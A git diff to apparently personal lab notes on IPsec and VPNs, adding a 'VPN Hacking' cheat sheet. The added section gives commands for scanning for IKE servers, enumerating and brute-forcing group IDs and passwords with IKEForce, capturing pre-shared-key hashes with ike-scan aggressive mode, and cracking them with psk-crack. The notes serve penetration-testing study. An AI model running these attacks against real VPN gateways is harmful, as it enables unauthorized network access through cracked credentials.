@@ -165,8 +165,52 @@ ifconfig tun0 mtu 1000
 Some issuse that you will face I will state here as demonstrative of the configuration difficulties post setup. [Ippsec Conceal Video discusses Ipsec](https://www.youtube.com/watch?v=1ae64CdwLHE), he also discussed using this picture to describe how with each cyclinder below is an additional amount of bytes per protocol. **IGNORE THE MESSAGE RECTANGLE**, assume the inner most Router is the message and that the maximum transmission size is 1500; the yellow being Ipsec adds another 50-5 bytes. With the referenced video, because you are using the OpenVPN to connect to HTB the blue cylinder is 60 overhead. So transport VPN inside a tunnel VPN. 
 ![](Onion_diagram.png)
 
+## VPN Hacking 
+
+Following is updated and noted mirror of VPN hacking sections of [GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt)
 
 
+`udp-protocol-scanner` is [GitHub CiscoCXSecurity/udp-proto-scanner](https://github.com/CiscoCXSecurity/udp-proto-scanner), so if `nmap`?
+```bash
+# Identify VPN servers:
+./udp-protocol-scanner.pl -p ike $ip
+
+# Scan a range for VPN servers:
+./udp-protocol-scanner.pl -p ike -f ip.txt
+```
+
+Use IKEForce to enumerate or dictionary attack VPN servers - This is a `python2` script this Archived on Github see [[Python-Tooling-Libraries]]:
+```bash
+# Original: pip install pyip
+# Requires the `pyip`, `pycrypto` and `pyopenssl` modules installed, but other than that it's only standard libs. `pyip` is the most likely lib that you won't have, install it with 'pip install pyip'
+# Updated use python-venv
+git clone https://github.com/SpiderLabs/ikeforce.git  
+
+# Perform IKE VPN enumeration with IKEForce:
+./ikeforce.py TARGET-IP â€“e â€“w wordlists/groupnames.dic  
+
+# Bruteforce IKE VPN using IKEForce:
+./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  
+```
+
+[kali tools ike-scan](https://www.kali.org/tools/ike-scan/) for Discovery and Fingerprinting for which IKE implementation
+```bash
+# Use ike-scan to capture the PSK hash:
+ike-scan
+ike-scan TARGET-IP
+ike-scan -A TARGET-IP
+ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
+ike-scan â€“M â€“A â€“n example\_group -P hash-file.txt TARGET-IP  
+```
+
+Use psk-crack to crack the PSK hash
+```bash
+psk-crack hash-file.txt
+pskcrack
+psk-crack -b 5 TARGET-IPkey
+psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
+psk-crack -d /path/to/dictionary-file TARGET-IP-key
+```
 ## References
 
 [THM Network Security Protocols](https://tryhackme.com/room/networksecurityprotocols)
@@ -176,4 +220,7 @@ Some issuse that you will face I will state here as demonstrative of the configu
 [Ippsec Conceal Video discusses Ipsec](https://www.youtube.com/watch?v=1ae64CdwLHE)
 [Wikipedia Internet Key Exchange](https://en.wikipedia.org/wiki/Internet_Key_Exchange "Internet Key Exchange")
 [Wikipedia Kerberized Internet Negotiation of Keys](https://en.wikipedia.org/wiki/Kerberized_Internet_Negotiation_of_Keys "Kerberized Internet Negotiation of Keys") 
+[kali tools ike-scan](https://www.kali.org/tools/ike-scan/)
+[GitHub CiscoCXSecurity/udp-proto-scanner](https://github.com/CiscoCXSecurity/udp-proto-scanner)
+[GitHub OlivierLaflamme/Cheatsheet-God Cheatsheet_Networking.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Networking.txt)
 [Troubleshoot Ipsec https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html](https://docs.netgate.com/pfsense/en/latest/troubleshooting/ipsec.html)
